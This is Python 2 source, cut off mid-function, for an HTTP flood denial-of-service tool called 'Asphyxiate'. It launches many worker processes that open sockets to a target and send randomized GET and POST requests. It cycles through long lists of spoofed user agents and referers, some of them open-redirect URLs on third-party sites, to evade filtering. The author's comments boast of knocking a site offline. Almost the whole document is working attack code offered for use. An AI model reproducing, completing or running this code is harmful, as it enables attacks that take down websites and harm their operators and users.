#Fully Coded by S0u1 and Notepad++ and running and stopping 
# Please if you edit give me credit -_-

"""
$Id: $
                                 HLoTW
//                                                        
//                                                        
//    .--.--.        ,----..                        ,---, 
//   /  /    '.     /   /   \                    ,`--.' | 
//  |  :  /`. /    /   .     :           ,--,   /    /  : 
//  ;  |  |--`    .   /   ;.  \        ,'_ /|  :    |.' ' 
//  |  :  ;_     .   ;   /  ` ;   .--. |  | :  `----':  | 
//   \  \    `.  ;   |  ; \ ; | ,'_ /| :  . |     '   ' ; 
//    `----.   \ |   :  | ; | ' |  ' | |  . .     |   | | 
//    __ \  \  | .   |  ' ' ' : |  | ' |  | |     '   : ; 
//   /  /`--'  / '   ;  \; /  | :  | : ;  ; |     |   | ' 
//  '--'.     /   \   \  ',  /  '  :  `--'   \    '   : | 
//    `--'---'     ;   :    /   :  ,      .-./    ;   |.' 
//                  \   \ .'     `--`----'        '---'   
//                   `---`                                

Asphyxiate is a DDoS tool managed to use sockets and sockets :D
asphyxiate means to suffocate aka strangulate lulz
remember to not share I gave u this to keep private I trust you ~S0u1

"""
#Import import import import :P remember always import import import cause no import import import means no attack :P
from multiprocessing import Process, Manager
import urlparse, ssl
import sys, getopt, random, time

# Python version-mine
if  sys.version_info < (3,0):
    # Python 2.7 Hell yez I am using httplib cause its hood <3
    import httplib
    HTTPCLIENT = httplib
else:
    # Python 3.x Dont know if it really works but worth a try sense 3.x has http clients
    import http.client
    HTTPCLIENT = http.client


DEBUG = False # Please keep at false 

#Method :P 

#Aye dont edit this cause you can freeze your computer :P
# Lol, I sent last time 200 B and 100 S and BOOM site down and in return
# Computer Froze ';..;'

METHOD_GET  = 'get'
METHOD_POST = 'post'
METHOD_RAND = 'random'

JOIN_TIMEOUT=1.0

DEFAULT_WORKERS=50
DEFAULT_SOCKETS=30

####
# Asphyxiate Class
####

class Asphyxiate(object):

    # Counters
    counter = [0, 0]
    last_counter = [0, 0]

    # Containers
    workersQueue = []
    manager = None

    # Keeping this none cause I used "0" didnt work so None works :P *Stupid S0u1"
    url = None

    # Options
    nr_workers = DEFAULT_WORKERS #Named to Bots cause it kinda acts like a bot lul
    nr_sockets = DEFAULT_SOCKETS
    method = METHOD_GET

    def __init__(self, url):

        # Set Fuxkin url
        self.url = url

        # Initialize Manager
        self.manager = Manager()

        # Initialize Counters
        self.counter = self.manager.list((0, 0))

    def exit(self):
        self.stats()
        print "Shutting down Asphyxiate"

    def __del__(self):
        self.exit()

    def printHeader(self):

        # Scawwy Taunt!
        print "Asphyxiate firing!"

    # Now the FIRE ';..;' PEW PEW PEW
    def fire(self):

        self.printHeader()
        print "Hitting webserver in mode {0} with {1} Bots running {2} connections each".format(self.method, self.nr_workers, self.nr_sockets)

        if DEBUG:
            print "Starting {0} concurrent Bot".format(self.nr_workers)

        # Starts Bots *Reminder I used the word Worker cause Im lazzy but I not done soon it will be bots
        for i in range(int(self.nr_workers)):

            try:

                worker = Laser(self.url, self.nr_sockets, self.counter)
                worker.method = self.method

                self.workersQueue.append(worker)
                worker.start()
            except (Exception):
                error("Failed to start worker {0}".format(i))
                pass 

        print "Initiating monitor"
        self.monitor()

    def stats(self):

        try:
            if self.counter[0] > 0 or self.counter[1] > 0:

                print "{0} Asphyxiate punches deferred. ({1} Failed)".format(self.counter[0], self.counter[1])

                if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
                    print "\tServer may be DOWN!"
    
                self.last_counter[0] = self.counter[0]
                self.last_counter[1] = self.counter[1]
        except (Exception):
            pass # silently ignore

    def monitor(self):
        while len(self.workersQueue) > 0:
            try:
                for worker in self.workersQueue:
                    if worker is not None and worker.is_alive():
                        worker.join(JOIN_TIMEOUT)
                    else:
                        self.workersQueue.remove(worker)

                self.stats()

            except (KeyboardInterrupt, SystemExit):
                print "CTRL+C received. Killing all Bots"
                for worker in self.workersQueue:
                    try:
                        if DEBUG:
                            print "Killing worker {0}".format(worker.name)
                        #worker.terminate()
                        worker.stop()
                    except Exception, ex:
                        pass # silently ignore
                if DEBUG:
                    raise
                else:
                    pass

# Class setup 

class Laser(Process):

        
    # This is the counter KEEP 0 Counters
    request_count = 0
    failed_count = 0

    # I used this for everything lol
    url = None
    host = None
    port = 80 # Current Port :P always lazy 80
    ssl = False
    referers = []
    useragents = []
    socks = []
    counter = None
    nr_socks = DEFAULT_SOCKETS

    # Flags Mines usa (Jokes)
    runnable = True

    # Now method option :P
    method = METHOD_GET

    def __init__(self, url, nr_sockets, counter):

        super(Laser, self).__init__()

        self.counter = counter
        self.nr_socks = nr_sockets

        parsedUrl = urlparse.urlparse(url)

        if parsedUrl.scheme == 'https':
            self.ssl = True

        self.host = parsedUrl.netloc.split(':')[0]
        self.url = parsedUrl.path

        self.port = parsedUrl.port

        if not self.port:
            self.port = 80 if not self.ssl else 443


        self.referers = [ 
            'http://www.google.com/?q=',
            'http://www.usatoday.com/search/results?q=',
            'http://engadget.search.aol.com/search?q=',
            'http://www.bing.com/search?q=',
            'http://search.yahoo.com/search?p=',
            'http://www.ask.com/web?q=',
            'http://search.lycos.com/web/?q=',
            'https://validator.w3.org/check?uri=',
            'http://validator.w3.org/checklink?uri=',
            'http://www.icap2014.com/cms/sites/all/modules/ckeditor_link/proxy.php?url=',
            'http://www.rssboard.org/rss-validator/check.cgi?url=',
            'http://www2.ogs.state.ny.us/help/urlstatusgo.html?url=',
            'http://prodvigator.bg/redirect.php?url=',
            'http://validator.w3.org/feed/check.cgi?url=',
            'http://www.ccm.edu/redirect/goto.asp?myURL=',
            'http://forum.buffed.de/redirect.php?url=',
            'http://www.inow.co.nz/redirect.php?url=',
            'http://www.automation-drive.com/redirect.php?url=',
            'http://mytinyfile.com/redirect.php?url=',
            'http://ruforum.mt5.com/redirect.php?url=',
            'http://www.websiteperformance.info/redirect.php?url=',
            'http://www.airberlin.com/site/redirect.php?url=',
            'http://www.rpz-ekhn.de/mail2date/ServiceCenter/redirect.php?url=',
            'http://evoec.com/review/redirect.php?url=',
            'http://www.crystalxp.net/redirect.php?url=',
            'http://watchmovies.cba.pl/articles/includes/redirect.php?url=',
            'http://www.seowizard.ir/redirect.php?url=',
            'http://apke.ru/redirect.php?url=',
            'http://seodrum.com/redirect.php?url=',
            'http://redrool.com/redirect.php?url=',
            'http://blog.eduzones.com/redirect.php?url=',
            'http://www.onlineseoreportcard.com/redirect.php?url=',
            'http://www.wickedfire.com/redirect.php?url=',
            'http://searchtoday.info/redirect.php?url=',
            'http://www.bobsoccer.ru/redirect.php?url=',
            'http://newsdiffs.org/article-history/iowaairs.org/redirect.php?url=',
            'http://www.firmia.cz/redirect.php?url=',
            'http://palinstravels.co.uk/redirect.php?url=',
            'http://www.phuketbranches.com/admin/redirect.php?url=',
            'http://tools.strugacreative.com/redirect.php?url=',
            'http://www.elec-intro.com/redirect.php?url=',
            'http://maybeit.net/redirect.php?url=',
            'http://www.usgpru.net/redirect.php?url=',
            'http://openwebstuff.com/wp-content/plugins/wp-js-external-link-info/redirect.php?url=',
            'http://www.webaverage.com/redirect.php?url=',
            'http://www.seorehash.com/redirect.php?url=',
            'http://' + self.host + '/'
            ]

#GOD FUCKING DAMN MY FINGERS HURRRRTTTT SOOOOOOOOOO FUUUUCCCKKKIIINNNGGGG BBBBAAADDD
#But , It's Worth is :D
        self.useragents = [
            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
            'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
            'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
            'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
            'Mozilla/5.0 (Linux; Android 4.4.4; Nexus 5 Build/KTU84Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I9305T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
            'Mozilla/5.0 (Linux; U; Android 4.2.2; my-mm; GT-M6a Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
            'Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00F Build/KVT49L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.141 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; I9192 Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
            'Mozilla/5.0 (Linux; Android 4.2.2; GT-P5100 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36',
            'Mozilla/5.0 (Linux; Android 4.3; SM-G7102 Build/JLS36C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.136 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 4.2.2; Galaxy S4 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 4.4.2; en-us; SM-N900A Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 4.4.4; XT1097 Build/KXE21.187-45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.117 Mobile',
            'Mozilla/5.0 (Linux; Android 4.4.4; XT1097 Build/KXE21.187-30.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile',
            'Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Lenovo A369i Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
            'Mozilla/5.0 (Linux; Android 4.3; D2305 Build/18.0.A.1.30) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; U; Android 4.4.2; en-gb; LG-D802 Build/KOT49I.D80220c) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; U; Android 4.2.2; vi-vn; mobiistar touch BEAN 402c Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
            'Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; XT1080 Build/SU4.21) AppleWebKit/537.16 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.16',
            'Mozilla/5.0 (Linux; U; Android 4.3; en-ca; HUAWEI G6-L11 Build/HuaweiG6-L11) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
            'Mozilla/5.0 (Linux; Android 4.1.2; LG-F160L Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; SonyC1505 Build/11.3.A.2.23) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
            'Mozilla/5.0 (Linux; U; Android 4.2.2; th-th; HUAWEI Y511-U30 Build/HUAWEIY511-U30) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
            'Mozilla/5.0 (Series40; Nokia2700c/09.98; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27',
            'Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2194.2 Safari/537.36',
            'Mozilla/5.0 (X11; Linux i686; rv:6.0.2) (Q7sip7ZS4Ba8FkDSOvRNleYM4KEG59V8+uT/RC1tW0U=) Gecko/20100101 Firefox/6.0.2',
            'Mozilla/5.0 (Windows NT 6.2; ARM; Trident/7.0; Touch; rv:11.0; WPDesktop; NOKIA; Lumia 925; ANZ892) like Gecko',
            'Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 925; ANZ892) like Gecko',
            'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; ; CJPMS_AAPCA4157828C9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.14 Safari/537.17',
            'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2194.2 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0 FirePHP/0.7.4',
            'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30',
            'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36',
            'Mozilla/5.0 (iPad; CPU OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/38.0.2125.59 Mobile/12A365 Safari/600.1.4',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.99 Safari/537.22',
            'Mozilla/5.0 (iPod touch; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4',
            'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.7 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36 OPR/25.0.1614.50',
            'Mozilla/5.0 (X11; CrOS x86_64 6158.64.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.108 Safari/537.36',
            'Guzzle/4.2.3 curl/7.35.0 PHP/5.5.9-1ubuntu4.4',
            'curl/7.30.0',
            'Mozilla/5.0 (Linux ia32) node.js/0.10.32 v8/3.14.5.9',
            'Mozilla/5.0 (compatible; Googlebot/4.1; en-US rv:9.3.7) Firefox/32.5',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7)',
            'AppleWebKit/534.48.3 (KHTML, like Gecko) Version/5.1 Safari/534.48.3',
            'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us)',
            'AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1)',
            'Gecko/20100101 Firefox/5.0.1',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0)',
            'AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30',
            'Opera/9.80 (Macintosh; Intel Mac OS X 10.7.0; U; Edition MacAppStore; en)',
            'Presto/2.9.168 Version/11.50',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2)',
            'Baiduspider+(+http://www.baidu.com/search/spider.htm)',
            'Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)',
            'Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)',
            'Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0;  http://www.beslist.nl/)',
            'BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)',
            'zspider/0.9-dev http://feedback.redkolibri.com/',
            'Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)',
            'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)',
            'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)',
            'Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)',
            'Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)',
            'Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)',
            'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
            'Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)',
            'Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)',
            'Mozilla/2.0 (compatible; Ask Jeeves/Teoma)',
            'TerrawizBot/1.0 (+http://www.terrawiz.com/bot.html)',
            'TheSuBot/0.2 (www.thesubot.de)',
            'FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)',
            'Mozilla/4.0 (compatible: FDSE robot)',
            'findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)',
            'findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)',
            'findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)',
            'findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)',
            'findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)',
            'Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable)',
            'Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable)',
            'Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)',
            'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2)',
            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2)',
            'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2)',
            'Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)',
            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3)',
            'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2)',
            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2)',
            'Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2)',
            'magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)',
            'Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)',
            'Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)',
            'MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)',
            'MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)',
            'Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)',
            'MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)',
            'Moreoverbot/5.1 ( http://w.moreover.com; webmaster@moreover.com) Mozilla/5.0)',
            'Moreoverbot/5.00 (+http://www.moreover.com; webmaster@moreover.com)',
            'msnbot/1.0 (+http://search.msn.com/msnbot.htm)',
            'msnbot/0.9 (+http://search.msn.com/msnbot.htm)',
            'msnbot/0.11 ( http://search.msn.com/msnbot.htm)',
            'MSNBOT/0.1 (http://search.msn.com/msnbot.htm)',
            'Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)',
            'NetResearchServer/4.0(loopimprovements.com/robot.html)',
            'Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)',
            'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)',
            'Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)',
            'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
            'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
            'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET) ',
            'Googlebot/2.1 (http://www.googlebot.com/bot.html)',
            'Opera/9.20 (Windows NT 6.0; U; en)',
            'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)',
            'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
            'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
            'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
            'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)',
            'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16)',
            'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)',
            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13)',
            'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
            'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
            'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)',
            'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
            'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0)',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8)',
            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
            'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)',
            'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51)',
            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
            'Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201Firefox/2.0.0.12',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7)',
            'AppleWebKit/534.48.3 (KHTML, like Gecko) Version/5.1 Safari/534.48.3',
            'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us)',
            'AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1)',
            'Gecko/20100101 Firefox/5.0.1',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0)',
            'AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30',
            'Opera/9.80 (Macintosh; Intel Mac OS X 10.7.0; U; Edition MacAppStore; en)',
            'Presto/2.9.168 Version/11.50',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2)',
            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
            'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
            'Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)',
            'magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)',
            'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
            'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
            'Mozilla/5.7.4 (Fedora015; U; AMD_PhenX6 Linux Kernal 2.6.35.2; en-UK) DevKit/534.7 (Gecko) Chrome/7.0.517.44 GoogleR/9.47.1[BlackPanda]',
                  ]

    def __del__(self):
        self.stop()


    #builds random ascii string to the target dontz ediz thiz 
    def buildblock(self, size):
        out_str = ''

        _LOWERCASE = range(97, 122)
        _UPPERCASE = range(65, 90)
        _NUMERIC   = range(48, 57)

        validChars = _LOWERCASE + _UPPERCASE + _NUMERIC

        for i in range(0, size):
            a = random.choice(validChars)
            out_str += chr(a)

        return out_str


    def run(self):

        if DEBUG:
            print "Starting bots {0}".format(self.name)

        while self.runnable:

            try:

                for i in range(self.nr_socks):
                
                    if self.ssl:
                        c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
                    else:
                        c = HTTPCLIENT.HTTPConnection(self.host, self.port)

                    self.socks.append(c)

                for conn_req in self.socks:

                    (url, headers) = self.createPayload()

                    method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method

                    conn_req.request(method.upper(), url, None, headers)

                for conn_resp in self.socks:

                    resp = conn_resp.getresponse()
                    self.incCounter()

                self.closeConnections()
                
            except:
                self.incFailed()
                if DEBUG:
                    raise
                else:
                    pass # silently ignore

        if DEBUG:
            print "Bots {0} completed run. Sleeping...".format(self.name)
            
    def closeConnections(self):
        for conn in self.socks:
            try:
                conn.close()
            except:
                pass # silently ignore
            

    def createPayload(self):

        req_url, headers = self.generateData()

        random_keys = headers.keys()
        random.shuffle(random_keys)
        random_headers = {}
        
        for header_name in random_keys:
            random_headers[header_name] = headers[header_name]

        return (req_url, random_headers)

    def generateQueryString(self, ammount = 1):

        queryString = []

        for i in range(ammount):

            key = self.buildblock(random.randint(3,10))
            value = self.buildblock(random.randint(3,20))
            element = "{0}={1}".format(key, value)
            queryString.append(element)

        return '&'.join(queryString)
            
    
    def generateData(self):

        returnCode = 0
        param_joiner = "?"

        if len(self.url) == 0:
            self.url = '/'

